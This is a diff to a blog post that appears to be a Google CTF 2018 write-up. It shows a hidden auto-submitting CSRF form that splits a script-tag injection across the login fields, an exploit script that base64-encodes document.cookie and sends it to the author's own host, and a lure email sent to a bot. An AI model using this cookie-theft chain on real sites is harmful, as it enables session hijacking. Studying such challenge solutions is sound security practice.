@@ -238,7 +238,56 @@ Wintermuted to use Firefox.</p>
 that. I also tried <code>onerror</code> of <code>&lt;img&gt;</code> tag, nothing. After observing the
 server response closely, <code>//</code> is added in between <code>username</code> and <code>password</code>,
 and Chrome woudln't catch it if it is used as part of <code>src</code> of a <code>&lt;script&gt;</code>
-tag.</p></div>
+tag.</p>
+<p>Since the log in page uses POST, I also need to create a page that submit a
+form using XSRF:</p>
+<pre><code class="HTML language-HTML">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Cats Pictures&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form method="POST" action="https://router-ui.web.ctfcompetition.com/login" style="display: none;"&gt;
+        &lt;input name="username" /&gt;
+        &lt;input name="password" /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        const form = document.querySelector("form");
+        const [user, pass] = form.querySelectorAll("input");
+        user.value = "&lt;script src='https:";
+        pass.value = "blog.jspenguin.com/other/Google_CTF_2018_2/exploit.js'&gt;&lt;\/script&gt;";
+        form.submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>The exploit script:</p>
+<pre><code class="JavaScript language-JavaScript">/**
+ * Exploit script for Google CTF 2018.
+ */
+"use strict";
+
+// Check domain to prevent misuse
+if (document.domain === "router-ui.web.ctfcompetition.com") {
+    const img = document.createElement("img");
+    img.src = "https://jspenguin.com/cat.png?" + btoa(document.cookie);
+    document.documentElement.append(img);
+}
+</code></pre>
+<p>I don't have the file on my server, but the cookies should land in the server
+logs. It's time to send the email:</p>
+<pre><code>TO: wintermuted@googlegroups.com
+Cat Pictures
+
+I want to steal your session cookies, no, I mean I have cat pictures here: https://blog.jspenguin.com/other/Google_CTF_2018_2/portal.html
+</code></pre>
+<p>After just a few seconds, I got a reply, probably from a bot:</p>
+<pre><code>Thanks for the link!
+
+Thanks for the  
+link "https://blog.jspenguin.com/other/Google_CTF_2018_2/portal.html", I'll  
+check it out as soon as possible!
+</code></pre></div>
 
     <div class="container footer">
         <p>By Hugo Xu (@jspenguin2017)</p>
